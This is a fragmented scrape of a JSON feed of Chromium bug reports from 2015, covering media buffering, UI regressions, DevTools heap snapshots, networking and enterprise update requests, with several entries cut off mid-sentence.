Play the shoutcast mp3 stream\r\n2. Wait for a track change\r\n3. Wait for the audio change associated with the track change\r\n\r\nWhat is the expected behavior?\r\nThe audio change should only be a few seconds if at all behind the track change.\r\n\r\nWhat went wrong?\r\nThe audio output lags by &gt;60s compared with the actual stream. It appears that mp3 streams are buffered substantially. If the stream is wrapped in an &lt;audio&gt; tag \r\neg &lt;audio autoplay controls=&quot;controls&quot; src=&quot;http://ice.somafm.com/groovesalad&quot; preload=&quot;none&quot;&gt;&lt;/audio&gt; then preload seems to have no effect on the buffer size. I would expect preload=&quot;none&quot; to minimise the buffer size but it doesn't appear to affect this at all.\r\n\r\nDid this work before? No \r\n\r\nIs it a problem with Flash or HTML5? HTML5\r\n\r\nDoes this work in other browsers? No Firefox 35.0.1, IE10\r\n\r\nChrome version: 40.0.2214.93  Channel: n/a\r\nOS Version: 6.1 (Windows 7, Windows Server 2008 R2)\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nIt's easier to see this when both the stream source and the browser output are under local control. Using something like Logitech Media Server means you can modify the stream on the fly and change track or pause the stream completely. It then becomes obvious that the output from &lt;audio&gt; in the browser has a substantial lag. Typically 70s or even more.\r\n\r\nWhat I would like to see is for the html5 browser to recognise a real time stream as being different from a fixed length file and to minimise buffering. This could be under (optional)code control either via the preload parameter or a new parameter that allowed explicit control over buffer time length.\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455619/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455619"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455619"}],"author":[{"name":{"$t":"julian.b...@gmail.com"},"uri":{"$t":"/u/106416716945076707395/"}}],"issues$closedDate":{"$t":"2015-02-24T20:03:08.000Z"},"issues$id":{"$t":455619},"issues$label":[{"$t":"Cr-Internals-Media"},{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Windows"},{"$t":"Needs-Feedback"}],"issues$stars":{"$t":1},"issues$state":{"$t":"closed"},"issues$status":{"$t":"WontFix"}},{"gd$etag":"W/\"C0UEQ347eCl7ImA9XRRQFUs.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455617"},"published":{"$t":"2015-02-05T10:04:33.000Z"},"updated":{"$t":"2015-02-10T09:40:02.000Z"},"title":{"$t":"Regression: Bookmarked page star icon doesn't remove in chrome://history page after clicking on it."},"content":{"$t":"Chrome Version       : 42.0.2295.0 (Official Build)9b213685f06300abf07e3ef2833c837043da026a-refs/heads/master@{#314531} 32/64-bit.\r\nOs: All(Win 7-Aero Enabled)\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.Launch chrome, go to any webpages (For Ex: www.google.com) &amp; bookmark it.\r\n2.Now, navigate to 'chrome://history' &amp; click on star icon to remove the added bookmark &amp; observe.\r\n\r\nStar icon doesn't get remove after clicking on it.\r\nStar icon should get removed after clicking on it.\r\n\r\nThis is a regression issue, broken in M-42 series, will soon update other info.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455617/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455617"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455617"}],"author":[{"name":{"$t":"dchau...@etouch.net"},"uri":{"$t":"/u/111177719400781150577/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/111909658475043446622/"},"issues$username":{"$t":"smok...@chromium.org"}}],"issues$closedDate":{"$t":"2015-02-06T22:59:21.000Z"},"issues$id":{"$t":455617},"issues$label":[{"$t":"Type-Bug-Regression"},{"$t":"Pri-1"},{"$t":"OS-All"},{"$t":"M-42"},{"$t":"Cr-UI-Browser-History"},{"$t":"Cr-UI-Browser-Bookmarks"},{"$t":"ReleaseBlock-Beta"},{"$t":"TE_Verified_M42"},{"$t":"TE_Verified_42.0.2298.0"}],"issues$owner":{"issues$uri":{"$t":"/u/107368609108491619938/"},"issues$username":{"$t":"hcarm...@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Fixed"}},{"gd$etag":"W/\"Ak8ASH47eCl7ImA9XRRbFE0.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455616"},"published":{"$t":"2015-02-05T10:03:28.000Z"},"updated":{"$t":"2015-04-07T12:14:09.000Z"},"title":{"$t":"Regression: Crash observed on restarting browser after deletion & addition of new profile."},"content":{"$t":"Chrome Version: 42.0.2295.0 (Official Build)9b213685f06300abf07e3ef2833c837043da026a-refs/heads/master@{#314531} - 64 bit.\r\nOS: Mac\r\n\r\nPrecondition: Change the System date, set it somewhere in the past (ex: 01st Feb 2014).\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.

Use busybox httpd to provide the following html page (testmultipart.html):\r\n   &lt;form action=&quot;/testmultipart.html&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;\r\n   &lt;input type=&quot;test&quot; name=&quot;text1&quot; /&gt; \r\n   &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;\r\n   &lt;input type=&quot;submit&quot; /&gt; \r\n   &lt;/form&gt; \r\n\r\n2. Select a file and click submit.\r\n\r\nWhat is the expected behavior?\r\nThe error page sent by the server should be displayed.\r\n\r\nWhat went wrong?\r\nThe busybox httpd reads the HTTP header with the POST request and immediately responds with a &quot;501 Not Implemented&quot; status while Chrome is still sending the multipart POST data.\r\n\r\nThe requesting Chrome tab doesn't stop loading, even though the developer tools show the network request to have failed with either ERR_CONNECTION_ABORTED or ERR_CONTENT_LENGTH_MISMATCH.\r\nAfterwards the chrome tab is no longer responsible and after a while the &quot;This tab does not respond&quot; dialog pops up.\r\n\r\nThe error page sent by the httpd is never shown.\r\n\r\nDid this work before?

    Reduce your resources if possible since the system gets under load and swapping is expensive and should be avoided\r\n3 critical pressure\r\n     We are running out of memory and we should try to

On any page, open devtools and make a timeline recording.\r\n2. Find a timeline record that includes a link in the record name or details, e.g. a link to a JS callsite.\r\n3. Click the link.

For example, the NL80211_WOWLAN_TRIG_PKT_PATTERN is an array of nested attributes when used in a NL80211_CMD_SET_WOWLAN message sent to the kernel to program the NIC, a binary attribute carrying a &amp;struct nl80211_pattern_support when sent from the kernel nested in a NL80211_ATTR_WOWLAN_TRIGGERS_SUPPORTED attribute in a NL80211_CMD_NEW_WIPHY message, and a u32 attribute containing the 0-based index of the pattern that caused the wakeup when used by the kernel in a NL80211_CMD_SET_WOWLAN message to report the wakeup reason to userspace.\r\n\r\nThere should be a way for the context of the message to be inferred from its contents upon receiving the message NetlinkManager::OnNlMessageReceived and then passed down to the relevant parsing function used to instantiate the C++ representation of the netlink message.

Use https://github.com/bnoordhuis/node-heapdump to generate a heapdump from a node.js application.  (You can find a super simple script for generating such a heap dump here: https://gist.github.com/jwalton/3c56adb94809bceaf759 or you can use the attached heapdump to recreate this.)\r\n2. Open dev tools, go to the &quot;Profiles&quot; tab, click load, and load the heap snapshot.\r\n\r\nWhat is the expected behavior?\r\n&quot;Retained Size&quot; column should show the retained size for each object in the heap snapshot.\r\n\r\nWhat went wrong?\r\nThe &quot;Retained Size&quot; column will show the exact same value as the &quot;Shallow Size&quot; column for (almost) all objects.\r\n\r\nIf you use the dropdown in the upper left to switch from &quot;Summary&quot; to &quot;Containment&quot;, you'll see the (GC roots) object appears, at a glance, to have a retained size which is different from the shallow size, but if you start drilling down into &quot;(GC roots)&quot;, you'll quickly find problems.  With the attached heap snapshot, expand &quot;(GC roots)&quot;, then &quot;(Global handles) @29&quot;, then &quot;function() @1325&quot; - @1325 shows a retained size of 72, yet contains four children with a combined shallow_size of 376.\r\n\r\nI have a ~250MB heap snapshot on my desktop right now which, in chrome devtools, shows &quot;(GC roots)&quot; as retaining a comically-low 1.5MB.\r\n\r\nDid this work before? N/A \r\n\r\nChrome version: 40.0.2214.94  Channel: stable\r\nOS Version: OS X 10.10.2\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nI've been doing this with node.js, but it's pretty easy to find examples like this with real web pages, too.  As a quick example:\r\n\r\n1. Go to google.ca\r\n2. Take a heap snapshot\r\n3. Go to the &quot;Containment&quot; view\r\n4. Expand &quot;(Document DOM trees)&quot;\r\n\r\nThe root &quot;(Document DOM trees)&quot; shows a retained size of ~19M, about 92% of the total heap.  The four children under &quot;(Document DOM trees)&quot;, though, add up to less than 3M of retained size - something here is clearly wrong.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455374/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455374"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455374"}],"author":[{"name":{"$t":"jwalto...@gmail.com"},"uri":{"$t":"/u/103172623870759081773/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/113675450667633581299/"},"issues$username":{"$t":"a...@chromium.org"}},{"issues$uri":{"$t":"/u/102113791455191111245/"},"issues$username":{"$t":"loi...@chromium.org"}}],"issues$id":{"$t":455374},"issues$label":[{"$t":"Cr-Platform-DevTools"},{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Mac"}],"issues$owner":{"issues$uri":{"$t":"/u/yurys@chromium.org/"},"issues$username":{"$t":"yurys@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"CUQMR347eCl7ImA9XRRQEEU.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455373"},"published":{"$t":"2015-02-04T20:56:26.000Z"},"updated":{"$t":"2015-02-04T20:56:26.000Z"},"title":{"$t":"Remove deprecated WebAudio items in M43"},"content":{"$t":"Setting the buffer attribute of an AudioBufferSourceNode more than once is deprecated.

Changing DnsPrefetchMsg_RequestPrefetch in-place to send a std::string still results in the messages not being delivered so I don't believe the problem is with the serialization of the message.\r\n\r\nIt looks like something is very broken with trying to route the DnsPrefetchMsg_RequestPrefetch message into the render message filter and the messages are not being handles (and no dns prefetches are being done).","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455342/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455342"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455342"}],"author":[{"name":{"$t":"pmee...@chromium.org"},"uri":{"$t":"/u/103409729632157599587/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/igrigorik@chromium.org/"},"issues$username":{"$t":"igrigorik@chromium.org"}},{"issues$uri":{"$t":"/u/ttuttle@chromium.org/"},"issues$username":{"$t":"ttuttle@chromium.org"}},{"issues$uri":{"$t":"/u/106283347138032735151/"},"issues$username":{"$t":"gun...@chromium.org"}},{"issues$uri":{"$t":"/u/103409729632157599587/"},"issues$username":{"$t":"pmee...@chromium.org"}}],"issues$closedDate":{"$t":"2015-02-06T17:09:11.000Z"},"issues$id":{"$t":455342},"issues$label":[{"$t":"Type-Bug-Regression"},{"$t":"Pri-2"},{"$t":"Cr-Internals-Network-DNS"},{"$t":"OS-All"},{"$t":"M-41"},{"$t":"merge-merged-2272"}],"issues$owner":{"issues$uri":{"$t":"/u/106283347138032735151/"},"issues$username":{"$t":"gun...@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Verified"}},{"gd$etag":"W/\"DEUASH47eCl7ImA9XRRUF04.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455336"},"published":{"$t":"2015-02-04T19:43:30.000Z"},"updated":{"$t":"2015-03-30T17:24:09.000Z"},"title":{"$t":"Yubikey nano stops working after Chromium crashes"},"content":{"$t":"Google Chrome\t41.0.2272.41 (Official Build) beta\r\nRevision\t183e8381c1ed989b3f1b725d33eaf787b8113090\r\nPlatform\t6680.25.0 (Official Build) beta-channel\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.

The current idea is to unpack the response from Omaha to determine if the failure was due to a lack of verified contents on the CWS. Then the client can ping Omaha for these verified contents less frequently, knowing they will not be created until the developer updates the CRX.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455268/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455268"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455268"}],"author":[{"name":{"$t":"jleichtl...@chromium.org"},"uri":{"$t":"/u/104168735647431128866/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/104168735647431128866/"},"issues$username":{"$t":"jleichtl...@chromium.org"}},{"issues$uri":{"$t":"/u/103668950161632995220/"},"issues$username":{"$t":"waff...@chromium.org"}},{"issues$uri":{"$t":"/u/117801047297405407441/"},"issues$username":{"$t":"mevis...@chromium.org"}}],"issues$closedDate":{"$t":"2015-02-04T18:18:08.000Z"},"issues$id":{"$t":455268},"issues$label":[{"$t":"OS-All"},{"$t":"Pri-2"},{"$t":"Type-Bug"},{"$t":"Cr-Platform-Extensions"}],"issues$mergedInto":{"issues$id":{"$t":373397},"issues$project":{"$t":"chromium"}},"issues$owner":{"issues$uri":{"$t":"/u/asargent@chromium.org/"},"issues$username":{"$t":"asargent@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Duplicate"}},{"gd$etag":"W/\"D0cMSH47eCl7ImA9XRRWFU0.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455263"},"published":{"$t":"2015-02-04T17:19:17.000Z"},"updated":{"$t":"2015-03-04T21:38:09.000Z"},"title":{"$t":"Linux: multiple definition of 'AtomicOps_Internalx86CPUFeatures' with non-component Debug build"},"content":{"$t":"Version: Chromium trunk revision beafd8cb7 (#314338)\r\nOS: Ubuntu 14.04 64-bit\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.

The elements often &quot;snap into place&quot; in their final state. This occurs most frequently when an element is transitioned multiple times. (e.g., clicking on the top &quot;obsessions&quot; menu item on http://qz.com will cause an overlay to slide down -- this transition often only happens once, if at all).  Rotate and scale do, however, seem to be happening consistently. 3D transitions also can &quot;snap into place&quot; at the end with the animation not completing ( also seen on http://tympanus.net ).\r\n* Transitions of CSS2 properties such as width and height do seem to be working consistently, but opacity animations can also intermittently behave as above.\r\n* Transitions on :hover states are also not happening consistently as has been reported in Chromium bug #451756 ( https://code.google.com/p/chromium/issues/detail?id=451756 ).\r\n\r\n\r\nPlease provide any additional information below.

&lt;garykac@chromium.org&gt;\r\nDate:   Tue Feb 3 13:45:20 2015 -0800\r\n\r\n    [Chromoting] Add ability to enable/disable GDrive support per-app in gyp.\r\n    \r\n    Since not all AppRemoting apps will want or need GDrive support to be\r\n    enabled, we need to be able to control which apps enable this feature.\r\n    \r\n    This cl adds 'app_features' to the AppRemoting gyp targets and passes\r\n    the list of features into the build_webapp script (so the manifest can\r\n    have the correct oauth scopes) and the webapp.\r\n    \r\n    Also, because the 'cast' capability was &quot;in the way&quot; for these changes,\r\n    it has been converted into a feature as well (default: disabled).\r\n    \r\n    BUG=\r\n    \r\n    Review URL:

I don't know why it's so much faster on Windows, though.\r\n\r\nIt looks like this function creates a bunch of objects.  I bet if we find out what's laggy we can do that object creation on a background thread and then copy the pointers to the initialized objects into place on the IO thread.\r\n\r\nMichael is going to investigate this further.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/454983/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=454983"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/454983"}],"author":[{"name":{"$t":"pkasting@chromium.org"},"uri":{"$t":"/u/pkasting@chromium.org/"}}],"issues$blockedOn":[{"issues$id":{"$t":465458},"issues$project":{"$t":"chromium"}}],"issues$closedDate":{"$t":"2015-04-11T01:37:51.000Z"},"issues$id":{"$t":454983},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"OS-All"},{"$t":"Hotlist-Slow"},{"$t":"Cr-Internals-Network-Proxy"},{"$t":"M-44"}],"issues$owner":{"issues$uri":{"$t":"/u/eroman@chromium.org/"},"issues$username":{"$t":"eroman@chromium.org"}},"issues$stars":{"$t":3},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Fixed"}},{"gd$etag":"W/\"C0UAQ347eCl7ImA9XRRQFU0.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/454981"},"published":{"$t":"2015-02-03T23:04:52.000Z"},"updated":{"$t":"2015-02-09T17:00:42.000Z"},"title":{"$t":"Material Icon"},"content":{"$t":"UserAgent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2292.0 Safari/537.36\r\n\r\nSteps to reproduce the problem:\r\n1.

For example, if Chrome browser is currently on v 39.0.1155.80, it can only update to other v 39 but can never reach 40+.\r\n\r\nUse case: Admin needs to ensure that productivity will not suffer due to a new update that would cause issues with their environment. As long as the build remains the same but does patch updates, no major issues can be encountered. \r\n\r\nMotivation: By preventing the update to of a new build so all users, they can test the latest release in their test environment  and then allow the update. \r\n\r\nExisting workarounds: Disable Chrome updates completely and admin can then push MSI via GPO when fully tested.\r\n\r\nAffected
